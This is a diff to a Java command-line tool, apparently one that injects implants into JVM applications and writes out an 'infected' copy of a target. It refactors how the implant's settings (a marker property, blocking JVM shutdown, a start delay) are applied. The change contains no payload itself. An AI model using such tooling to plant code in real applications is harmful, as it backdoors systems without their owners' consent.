@@ -7,10 +7,7 @@ import org.example.implants.ClassImplant;
 import org.example.implants.MethodImplant;
 import org.example.implants.SpringImplantConfiguration;
 import org.example.implants.SpringImplantController;
-import org.example.injector.ClassInjector;
-import org.example.injector.ImplantHandler;
-import org.example.injector.MethodInjector;
-import org.example.injector.SpringInjector;
+import org.example.injector.*;
 
 import java.io.IOException;
 import java.nio.file.Files;
@@ -229,10 +226,15 @@ public class Cli {
         for (Map.Entry<String, ImplantHandler.ConfDataType> entry : availableConfig.entrySet()) {
             System.out.println("[i] " + entry.getKey() + " (" + entry.getValue() + ")");
         }
-        implantHandler.getConfigModifications().put("CONF_JVM_MARKER_PROP", "this.is.a.test");
-        implantHandler.getConfigModifications().put("CONF_BLOCK_JVM_SHUTDOWN", true);
-        implantHandler.getConfigModifications().put("CONF_DELAY_MS", 2000);
-        System.out.println();
+        try {
+            implantHandler.setConfig("CONF_JVM_MARKER_PROP", "this.is.a.test");
+            implantHandler.setConfig("CONF_BLOCK_JVM_SHUTDOWN", true);
+            implantHandler.setConfig("CONF_DELAY_MS", 2000);
+            System.out.println("[+] Wrote custom config.");
+        } catch (ImplantConfigException e) {
+            System.out.println("[!] Failed to write custom config: " + e.getMessage());
+            System.exit(1);
+        }
 
         try {
             boolean didInfect = injector.infect(targetPath, outputPath);
